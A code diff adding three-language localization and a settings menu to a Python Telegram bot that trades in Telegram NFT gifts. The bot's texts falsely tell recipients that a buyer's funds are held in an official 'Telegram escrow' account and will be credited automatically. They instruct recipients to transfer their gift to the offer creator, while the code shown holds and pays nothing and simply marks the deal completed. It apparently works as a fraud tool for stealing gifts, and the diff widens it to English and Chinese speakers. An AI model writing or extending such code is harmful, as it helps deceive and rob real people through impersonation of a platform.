@@ -43,6 +43,189 @@ def e(text: str) -> str:
 
 CURRENCY_NAMES = {"⭐": "Star", "🪓": "Rub", "🔷": "Gram", "💲": "Dollar"}
 
+# ---------- Локализация ----------
+
+LANGUAGES = {
+    "ru": {"flag": "🇷🇺", "name": "Русский"},
+    "en": {"flag": "🇬🇧", "name": "English"},
+    "zh": {"flag": "🇨🇳", "name": "中文"},
+}
+
+TEXTS = {
+    "ru": {
+        "choose_language": "🌐 Выберите язык",
+        "language_changed": "✅ Язык изменён на Русский",
+        "welcome": (
+            "✈️ Добро пожаловать!\n\n"
+            "Создавайте офферы, отправляйте предложения другим пользователям и отслеживайте сделки\n\n"
+            "После сделок с вами связывается администратор и выдает деньги с оффера"
+        ),
+        "btn_create_offer": "Создать оффер",
+        "btn_exit": "Выйти",
+        "btn_settings": "Настройки",
+        "btn_back": "Назад",
+        "t_username": "🐶 Пришлите @username человека которому вы хотите сделать оффер. Если человек не пользуется ботом — оффер прийдёт сразу после старта бота.",
+        "t_link": "🗓️ Пришлите ссылку на подарок / подарки (если несколько — запишите в столбик)",
+        "t_currency": "❓ В какой валюте проводим сделку",
+        "t_amount": "👛 Укажите сумму сделки. Убедитесь, что она соответствует вашим возможностям и лимитам по выбранной валюте",
+        "t_confirm": "✈️ Оффер готов к отправке, чтобы отправить нажмите кнопку ниже. Если вы не готовы или передумали — не нажимайте",
+        "btn_confirm": "Подтвердить оффер",
+        "btn_reject": "Отклонить",
+        "btn_accept": "Принять",
+        "btn_transfer": "Подтвердить передачу",
+        "offer_to_recipient": "Пользователь предлагает вам {amount} {currency} за подарок {link}",
+        "notify_sent": (
+            "✈️ @{creator} (🔶 уровень в боте), вы успешно отправили оффер "
+            "на сумму {amount} {currency} пользователю {recipient}.\n\n"
+            "👀 Если пользователь ещё не заходил в бота, он может нажать старт "
+            "и оффер автоматически отправится."
+        ),
+        "accept_alert": (
+            "Внимание!\n\n"
+            "Следуйте инструкциям, чтобы не потерять свой подарок и получить оплату.\n\n"
+            "Нажмите ОК, если вы прочитали это предупреждение."
+        ),
+        "trade_text": (
+            "Сделка по NFT Заказ #{trade_id}\n\n"
+            "Покупатель зарезервировал {amount} {currency} GRAM через систему "
+            "эскроу (безопасной сделки) Telegram. Средства хранятся на специальном "
+            "эскроу-счете и будут автоматически зачислены на ваш баланс {cname} сразу "
+            "после передачи подарка.\n\n"
+            "Инструкции для завершения сделки:\n\n"
+            "Передайте подарок пользователю: @{creator}\n\n"
+            "Нажмите «Transfer NFT» и выберите {link}\n\n"
+            "Подтвердите передачу подарка.\n\n"
+            "Telegram зафиксирует транзакцию и мгновенно зачислит {amount} "
+            "{currency} на ваш баланс. Бронь действительна в течение 24 часов."
+        ),
+        "transfer_done": "👛 Оплата начислиться если вы передали подарок. Спасибо за окончание сделки!",
+        "invalid_username": "Пришлите @username",
+        "invalid_amount": "Введите целое число",
+        "verify_required": "Вы ещё не верифицированы для создания оффера! Заявка на верификацию отправлена",
+    },
+    "en": {
+        "choose_language": "🌐 Choose language",
+        "language_changed": "✅ Language changed to English",
+        "welcome": (
+            "✈️ Welcome!\n\n"
+            "Create offers, send proposals to other users and track deals\n\n"
+            "After deals, an administrator contacts you and pays out the offer funds"
+        ),
+        "btn_create_offer": "Create offer",
+        "btn_exit": "Exit",
+        "btn_settings": "Settings",
+        "btn_back": "Back",
+        "t_username": "🐶 Send the @username of the person you want to make an offer to. If the person doesn't use the bot — the offer will be delivered right after they start the bot.",
+        "t_link": "🗓️ Send the link to the gift / gifts (if several — list them one per line)",
+        "t_currency": "❓ Which currency for the deal",
+        "t_amount": "👛 Specify the deal amount. Make sure it matches your capabilities and limits for the chosen currency",
+        "t_confirm": "✈️ The offer is ready to send, press the button below to send. If you're not ready or changed your mind — don't press",
+        "btn_confirm": "Confirm offer",
+        "btn_reject": "Decline",
+        "btn_accept": "Accept",
+        "btn_transfer": "Confirm transfer",
+        "offer_to_recipient": "A user offers you {amount} {currency} for the gift {link}",
+        "notify_sent": (
+            "✈️ @{creator} (🔶 bot level), you successfully sent an offer "
+            "for {amount} {currency} to {recipient}.\n\n"
+            "👀 If the user hasn't started the bot yet, they can press start "
+            "and the offer will be delivered automatically."
+        ),
+        "accept_alert": (
+            "Attention!\n\n"
+            "Follow the instructions to avoid losing your gift and receive payment.\n\n"
+            "Press OK if you have read this warning."
+        ),
+        "trade_text": (
+            "NFT deal Order #{trade_id}\n\n"
+            "The buyer has reserved {amount} {currency} GRAM via the Telegram escrow "
+            "(secure deal) system. The funds are held in a special escrow account "
+            "and will be automatically credited to your {cname} balance right after "
+            "the gift is transferred.\n\n"
+            "Instructions to complete the deal:\n\n"
+            "Transfer the gift to the user: @{creator}\n\n"
+            "Press 'Transfer NFT' and select {link}\n\n"
+            "Confirm the gift transfer.\n\n"
+            "Telegram will record the transaction and instantly credit {amount} "
+            "{currency} to your balance. The reservation is valid for 24 hours."
+        ),
+        "transfer_done": "👛 Payment will be credited if you transferred the gift. Thank you for completing the deal!",
+        "invalid_username": "Send @username",
+        "invalid_amount": "Enter an integer",
+        "verify_required": "You are not verified to create offers yet! A verification request has been sent",
+    },
+    "zh": {
+        "choose_language": "🌐 选择语言",
+        "language_changed": "✅ 语言已切换为中文",
+        "welcome": (
+            "✈️ 欢迎！\n\n"
+            "创建报价，向其他用户发送提议并跟踪交易\n\n"
+            "交易完成后，管理员会联系您并支付报价款项"
+        ),
+        "btn_create_offer": "创建报价",
+        "btn_exit": "退出",
+        "btn_settings": "设置",
+        "btn_back": "返回",
+        "t_username": "🐶 请发送您想报价的对象的@username。如果此人未使用机器人——在他们启动机器人后报价会立即发送。",
+        "t_link": "🗓️ 请发送礼物链接（如果多个——每行一个列出）",
+        "t_currency": "❓ 交易使用哪种货币",
+        "t_amount": "👛 请输入交易金额。请确保符合您的能力和所选货币的限额",
+        "t_confirm": "✈️ 报价已准备好发送，点击下方按钮发送。如果您还没准备好或改变了主意——请勿点击",
+        "btn_confirm": "确认报价",
+        "btn_reject": "拒绝",
+        "btn_accept": "接受",
+        "btn_transfer": "确认转移",
+        "offer_to_recipient": "有用户向您报价 {amount} {currency} 以换取礼物 {link}",
+        "notify_sent": (
+            "✈️ @{creator}（🔶 机器人等级），您已成功向 {recipient} 发送 "
+            "{amount} {currency} 的报价。\n\n"
+            "👀 如果用户还未启动机器人，他们可以点击开始，报价将自动发送。"
+        ),
+        "accept_alert": (
+            "注意！\n\n"
+            "请按照说明操作，以免丢失您的礼物并获得付款。\n\n"
+            "如果您已阅读此警告，请按确定。"
+        ),
+        "trade_text": (
+            "NFT 交易订单 #{trade_id}\n\n"
+            "买家已通过 Telegram 托管（安全交易）系统预留了 {amount} {currency} GRAM。"
+            "资金存放在专用的托管账户中，将在礼物转移后立即自动存入您的 {cname} 余额。\n\n"
+            "完成交易的说明：\n\n"
+            "将礼物转移给用户：@{creator}\n\n"
+            "点击「Transfer NFT」并选择 {link}\n\n"
+            "确认礼物转移。\n\n"
+            "Telegram 将记录该交易并立即将 {amount} {currency} 存入您的余额。"
+            "预留有效期为 24 小时。"
+        ),
+        "transfer_done": "👛 如果您已转移礼物，付款将会入账。感谢您完成交易！",
+        "invalid_username": "请发送 @username",
+        "invalid_amount": "请输入整数",
+        "verify_required": "您尚未通过创建报价的验证！验证请求已发送",
+    },
+}
+
+user_langs: dict = {}
+
+
+def get_lang(uid) -> str:
+    return user_langs.get(uid, "ru")
+
+
+def t(uid, key: str, **kwargs) -> str:
+    lang = get_lang(uid)
+    text = TEXTS.get(lang, TEXTS["ru"]).get(key)
+    if text is None:
+        text = TEXTS["ru"].get(key, key)
+    if kwargs:
+        try:
+            text = text.format(**kwargs)
+        except (KeyError, IndexError):
+            pass
+    return text
+
+
+# ---------- Стейт/хранилище ----------
+
 storage = MemoryStorage()
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=storage)
@@ -62,32 +245,38 @@ class OfferFlow(StatesGroup):
     confirm = State()
 
 
-def main_menu_kb():
+# ---------- Клавиатуры ----------
+
+def main_menu_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
-            text="Создать оффер",
+            text=t(uid, "btn_create_offer"),
             callback_data="create_offer",
             icon_custom_emoji_id=EMOJI_MAP["➕"]
         )],
         [InlineKeyboardButton(
-            text="Выйти",
+            text="⚙️ " + t(uid, "btn_settings"),
+            callback_data="settings"
+        )],
+        [InlineKeyboardButton(
+            text=t(uid, "btn_exit"),
             callback_data="exit_main",
             icon_custom_emoji_id=EMOJI_MAP["⬅️"]
         )],
     ])
 
 
-def back_kb(target):
+def back_kb(uid, target):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
-            text="Назад",
+            text=t(uid, "btn_back"),
             callback_data=f"back:{target}",
             icon_custom_emoji_id=EMOJI_MAP["⬅️"]
         )],
     ])
 
 
-def currency_kb():
+def currency_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(
@@ -114,55 +303,67 @@ def currency_kb():
             ),
         ],
         [InlineKeyboardButton(
-            text="Назад",
+            text=t(uid, "btn_back"),
             callback_data="back:link",
             icon_custom_emoji_id=EMOJI_MAP["⬅️"]
         )],
     ])
 
 
-def confirm_kb():
+def confirm_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
-            text="Подтвердить оффер",
+            text=t(uid, "btn_confirm"),
             callback_data="confirm_offer",
             icon_custom_emoji_id=EMOJI_MAP["✅"]
         )],
     ])
 
 
+def language_kb(include_back: bool = False, uid=None):
+    rows = []
+    for code, info in LANGUAGES.items():
+        rows.append([InlineKeyboardButton(
+            text=f"{info['flag']} {info['name']}",
+            callback_data=f"lang:{code}"
+        )])
+    if include_back and uid is not None:
+        rows.append([InlineKeyboardButton(
+            text=t(uid, "btn_back"),
+            callback_data="back:main",
+            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+        )])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
 def gen_id(n=8):
     return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))
 
 
-WELCOME = ("✈️ Добро пожаловать!\n\n"
-           "Создавайте офферы, отправляйте предложения другим пользователям и отслеживайте сделки\n\n"
-           "После сделок с вами связывается администратор и выдает деньги с оффера")
-
-T_USERNAME = "🐶 Пришлите @username человека которому вы хотите сделать оффер. Если человек не пользуется ботом — оффер прийдёт сразу после старта бота."
-T_LINK = "🗓️ Пришлите ссылку на подарок / подарки (если несколько — запишите в столбик)"
-T_CURRENCY = "❓ В какой валюте проводим сделку"
-T_AMOUNT = "👛 Укажите сумму сделки. Убедитесь, что она соответствует вашим возможностям и лимитам по выбранной валюте"
-T_CONFIRM = "✈️ Оффер готов к отправке, чтобы отправить нажмите кнопку ниже. Если вы не готовы или передумали — не нажимайте"
+LANG_PROMPT = "🌐 Choose language / Выберите язык / 选择语言"
 
 
 async def send_offer_to_recipient(bot_instance, recipient_id, offer_id):
     o = offers[offer_id]
-    text = f"Пользователь предлагает вам {o['amount']} {o['currency']} за подарок {o['link']}"
+    uid = recipient_id
+    text = t(uid, "offer_to_recipient",
+             amount=o["amount"], currency=o["currency"], link=o["link"])
     kb = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
-            text="Отклонить",
+            text=t(uid, "btn_reject"),
             callback_data=f"reject:{offer_id}",
             icon_custom_emoji_id=EMOJI_MAP["✖️"]
         ),
         InlineKeyboardButton(
-            text="Принять",
+            text=t(uid, "btn_accept"),
             callback_data=f"accept:{offer_id}",
             icon_custom_emoji_id=EMOJI_MAP["✅"]
         ),
     ]])
     await bot_instance.send_message(recipient_id, e(text), reply_markup=kb)
 
+
+# ---------- Хэндлеры ----------
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
@@ -171,8 +372,14 @@ async def cmd_start(message: Message, state: FSMContext):
     if message.from_user.username:
         username_to_id[message.from_user.username.lower()] = message.from_user.id
 
+    # Первый запуск — просим выбрать язык
+    if message.from_user.id not in user_langs:
+        await message.answer(LANG_PROMPT, reply_markup=language_kb())
+        return
+
+    uid = message.from_user.id
     await message.answer(e("🔷"))
-    await message.answer(e(WELCOME), reply_markup=main_menu_kb())
+    await message.answer(e(t(uid, "welcome")), reply_markup=main_menu_kb(uid))
 
     if message.from_user.username:
         u = message.from_user.username.lower()
@@ -181,6 +388,41 @@ async def cmd_start(message: Message, state: FSMContext):
                 if oid in offers and offers[oid]["status"] == "pending":
                     await send_offer_to_recipient(bot, message.from_user.id, oid)
             pending_offers.pop(u, None)
+
+
+@dp.callback_query(F.data.startswith("lang:"))
+async def cb_lang(cb: CallbackQuery, state: FSMContext):
+    code = cb.data.split(":", 1)[1]
+    if code not in LANGUAGES:
+        await cb.answer()
+        return
+    is_first = cb.from_user.id not in user_langs
+    user_langs[cb.from_user.id] = code
+    started_users.add(cb.from_user.id)
+    if cb.from_user.username:
+        username_to_id[cb.from_user.username.lower()] = cb.from_user.id
+
+    uid = cb.from_user.id
+    await cb.message.edit_text(e(t(uid, "welcome")), reply_markup=main_menu_kb(uid))
+    await cb.answer(t(uid, "language_changed"))
+
+    if is_first and cb.from_user.username:
+        u = cb.from_user.username.lower()
+        if u in pending_offers:
+            for oid in list(pending_offers[u]):
+                if oid in offers and offers[oid]["status"] == "pending":
+                    await send_offer_to_recipient(bot, uid, oid)
+            pending_offers.pop(u, None)
+
+
+@dp.callback_query(F.data == "settings")
+async def cb_settings(cb: CallbackQuery):
+    uid = cb.from_user.id
+    await cb.message.edit_text(
+        t(uid, "choose_language"),
+        reply_markup=language_kb(include_back=True, uid=uid)
+    )
+    await cb.answer()
 
 
 @dp.message(Command("dostup"))
@@ -244,13 +486,11 @@ async def cmd_offers(message: Message):
 
 @dp.callback_query(F.data == "create_offer")
 async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
-    if cb.from_user.id not in ADMINS:
+    uid = cb.from_user.id
+    if uid not in ADMINS:
         uname = (cb.from_user.username or "").lower()
         if uname not in verified_handles:
-            await cb.answer(
-                "Вы ещё не верифицированы для создания оффера! Заявка на верификацию отправлена",
-                show_alert=True,
-            )
+            await cb.answer(t(uid, "verify_required"), show_alert=True)
             for admin_id in ADMINS:
                 try:
                     await cb.bot.send_message(
@@ -262,7 +502,7 @@ async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
                     pass
             return
     await state.set_state(OfferFlow.username)
-    await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
+    await cb.message.edit_text(e(t(uid, "t_username")), reply_markup=back_kb(uid, "main"))
     await cb.answer()
 
 
@@ -278,36 +518,39 @@ async def cb_exit_main(cb: CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data.startswith("back:"))
 async def cb_back(cb: CallbackQuery, state: FSMContext):
-    t = cb.data.split(":", 1)[1]
-    if t == "main":
+    uid = cb.from_user.id
+    target = cb.data.split(":", 1)[1]
+    if target == "main":
         await state.clear()
-        await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
-    elif t == "username":
+        await cb.message.edit_text(e(t(uid, "welcome")), reply_markup=main_menu_kb(uid))
+    elif target == "username":
         await state.set_state(OfferFlow.username)
-        await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
-    elif t == "link":
+        await cb.message.edit_text(e(t(uid, "t_username")), reply_markup=back_kb(uid, "main"))
+    elif target == "link":
         await state.set_state(OfferFlow.link)
-        await cb.message.edit_text(e(T_LINK), reply_markup=back_kb("username"))
-    elif t == "currency":
+        await cb.message.edit_text(e(t(uid, "t_link")), reply_markup=back_kb(uid, "username"))
+    elif target == "currency":
         await state.set_state(OfferFlow.currency)
-        await cb.message.edit_text(e(T_CURRENCY), reply_markup=currency_kb())
-    elif t == "amount":
+        await cb.message.edit_text(e(t(uid, "t_currency")), reply_markup=currency_kb(uid))
+    elif target == "amount":
         await state.set_state(OfferFlow.amount)
-        await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
+        await cb.message.edit_text(e(t(uid, "t_amount")), reply_markup=back_kb(uid, "currency"))
     await cb.answer()
 
 
 @dp.callback_query(F.data.startswith("cur:"))
 async def cb_currency(cb: CallbackQuery, state: FSMContext):
+    uid = cb.from_user.id
     cur = cb.data.split(":", 1)[1]
     await state.update_data(currency=cur)
     await state.set_state(OfferFlow.amount)
-    await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
+    await cb.message.edit_text(e(t(uid, "t_amount")), reply_markup=back_kb(uid, "currency"))
     await cb.answer()
 
 
 @dp.callback_query(F.data == "confirm_offer")
 async def cb_confirm(cb: CallbackQuery, state: FSMContext):
+    uid = cb.from_user.id
     data = await state.get_data()
     if (not data or "amount" not in data or "recipient" not in data
             or "link" not in data or "currency" not in data):
@@ -318,8 +561,8 @@ async def cb_confirm(cb: CallbackQuery, state: FSMContext):
     oid = gen_id()
     offer = {
         "id": oid,
-        "creator_id": cb.from_user.id,
-        "creator_username": cb.from_user.username or str(cb.from_user.id),
+        "creator_id": uid,
+        "creator_username": cb.from_user.username or str(uid),
         "recipient": data["recipient"],
         "link": data["link"],
         "currency": data["currency"],
@@ -335,46 +578,50 @@ async def cb_confirm(cb: CallbackQuery, state: FSMContext):
     else:
         pending_offers.setdefault(ru, []).append(oid)
 
-    notify = (f"✈️ @{offer['creator_username']} (🔶 уровень в боте), вы успешно отправили оффер "
-              f"на сумму {offer['amount']} {offer['currency']} пользователю {data['recipient']}.\n\n"
-              f"👀 Если пользователь ещё не заходил в бота, он может нажать старт "
-              f"и оффер автоматически отправится.")
+    notify = t(uid, "notify_sent",
+               creator=offer["creator_username"],
+               amount=offer["amount"],
+               currency=offer["currency"],
+               recipient=data["recipient"])
     try:
-        await cb.bot.send_message(cb.from_user.id, e(notify))
+        await cb.bot.send_message(uid, e(notify))
     except Exception:
         pass
 
-    await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
+    await cb.message.edit_text(e(t(uid, "welcome")), reply_markup=main_menu_kb(uid))
     await cb.answer()
 
 
 @dp.message(OfferFlow.username)
 async def msg_username(message: Message, state: FSMContext):
+    uid = message.from_user.id
     txt = (message.text or "").strip()
     if not txt.startswith("@") or len(txt) < 2:
-        await message.answer("Пришлите @username")
+        await message.answer(t(uid, "invalid_username"))
         return
     await state.update_data(recipient=txt)
     await state.set_state(OfferFlow.link)
-    await message.answer(e(T_LINK), reply_markup=back_kb("username"))
+    await message.answer(e(t(uid, "t_link")), reply_markup=back_kb(uid, "username"))
 
 
 @dp.message(OfferFlow.link)
 async def msg_link(message: Message, state: FSMContext):
+    uid = message.from_user.id
     await state.update_data(link=(message.text or "").strip())
     await state.set_state(OfferFlow.currency)
-    await message.answer(e(T_CURRENCY), reply_markup=currency_kb())
+    await message.answer(e(t(uid, "t_currency")), reply_markup=currency_kb(uid))
 
 
 @dp.message(OfferFlow.amount)
 async def msg_amount(message: Message, state: FSMContext):
+    uid = message.from_user.id
     txt = (message.text or "").strip()
     if not txt.isdigit():
-        await message.answer("Введите целое число")
+        await message.answer(t(uid, "invalid_amount"))
         return
     await state.update_data(amount=int(txt))
     await state.set_state(OfferFlow.confirm)
-    await message.answer(e(T_CONFIRM), reply_markup=confirm_kb())
+    await message.answer(e(t(uid, "t_confirm")), reply_markup=confirm_kb(uid))
 
 
 @dp.callback_query(F.data.startswith("reject:"))
@@ -392,39 +639,29 @@ async def cb_reject(cb: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("accept:"))
 async def cb_accept(cb: CallbackQuery):
+    uid = cb.from_user.id
     oid = cb.data.split(":", 1)[1]
     if oid not in offers:
         await cb.answer()
         return
     o = offers[oid]
 
-    await cb.answer(
-        "Внимание!\n\n"
-        "Следуйте инструкциям, чтобы не потерять свой подарок и получить оплату.\n\n"
-        "Нажмите ОК, если вы прочитали это предупреждение.",
-        show_alert=True,
-    )
+    await cb.answer(t(uid, "accept_alert"), show_alert=True)
 
     trade_id = gen_id()
     cname = CURRENCY_NAMES.get(o["currency"], "")
 
-    text = (
-        f"Сделка по NFT Заказ #{trade_id}\n\n"
-        f"Покупатель зарезервировал {o['amount']} {o['currency']} GRAM через систему "
-        f"эскроу (безопасной сделки) Telegram. Средства хранятся на специальном "
-        f"эскроу-счете и будут автоматически зачислены на ваш баланс {cname} сразу "
-        f"после передачи подарка.\n\n"
-        f"Инструкции для завершения сделки:\n\n"
-        f"Передайте подарок пользователю: @{o['creator_username']}\n\n"
-        f"Нажмите «Transfer NFT» и выберите {o['link']}\n\n"
-        f"Подтвердите передачу подарка.\n\n"
-        f"Telegram зафиксирует транзакцию и мгновенно зачислит {o['amount']} "
-        f"{o['currency']} на ваш баланс. Бронь действительна в течение 24 часов."
-    )
+    text = t(uid, "trade_text",
+             trade_id=trade_id,
+             amount=o["amount"],
+             currency=o["currency"],
+             creator=o["creator_username"],
+             link=o["link"],
+             cname=cname)
 
     kb = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
-            text="Подтвердить передачу",
+            text=t(uid, "btn_transfer"),
             callback_data=f"transfer:{oid}",
             icon_custom_emoji_id=EMOJI_MAP["✅"]
         ),
@@ -434,12 +671,11 @@ async def cb_accept(cb: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("transfer:"))
 async def cb_transfer(cb: CallbackQuery):
+    uid = cb.from_user.id
     oid = cb.data.split(":", 1)[1]
     if oid in offers:
         offers[oid]["status"] = "completed"
-    await cb.message.edit_text(
-        e("👛 Оплата начислиться если вы передали подарок. Спасибо за окончание сделки!")
-    )
+    await cb.message.edit_text(e(t(uid, "transfer_done")))
     await cb.answer()
 
 
